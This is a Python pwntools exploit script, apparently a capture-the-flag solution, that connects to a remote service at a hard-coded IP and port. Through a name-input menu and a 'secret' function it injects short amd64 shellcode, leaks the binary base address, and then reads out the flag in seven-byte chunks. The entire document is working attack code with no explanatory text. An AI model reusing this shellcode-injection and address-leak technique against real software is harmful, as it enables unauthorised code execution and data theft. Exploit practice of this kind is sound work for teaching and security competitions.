#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('124.16.75.162', 31050)

def choice(c):
    p.sendlineafter(b'> ', c)

def alloc():
    choice(b'0')

def free():
    choice(b'1')

def get_name(name):
    choice(b'2')
    p.sendlineafter(b'input your name: ', name)

def print_name():
    choice(b'3')

def secret():
    choice(b'4')

# leak
sh = asm('''
    push rax
    pop rdi
    push rcx
    pop rdx
    syscall
    ret
''')
info(disasm(sh))
get_name(sh)
#gdb.attach(p, 'b secret\nc')
secret()
p.send(8 * b'A')
print_name()
p.recvuntil(8 * b'A')
binary_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x1429
info('binary_base = ' + hex(binary_base))

buf = binary_base + 0x4080

# local libc
# stdout: 0x1ec6a0
# stdin: 0x1eb980
# stderr: 0x1ec5c0
#get_name(sh)
#p.send(8 * b'A' + p64(binary_base + 0x1429) + p64(binary_base + 0x1404) + p64(binary_base + 0x12c9) + p64(binary_base + 0x13d5) + p64(binary_base + 0x1304))

for i in range(3):
    sh = asm('''
        ret
    ''')
    #info(disasm(sh))
    get_name(sh)
    #gdb.attach(p, 'b secret\nc')
    secret()

flag = b''
sh = asm('''
    push rdx
    pop rdi
    syscall
    ret
''')
info(disasm(sh))
for i in range(6):
    get_name(sh.ljust(7, b'P'))
    #gdb.attach(p, 'b *secret+44\nc')
    secret()
    print_name()
    p.recvuntil(b'Have a nice time: ')
    data = p.recv(7)
    print(data)
    flag += data

flag = flag.split(b'\n')[0]
print(flag)
p.close()

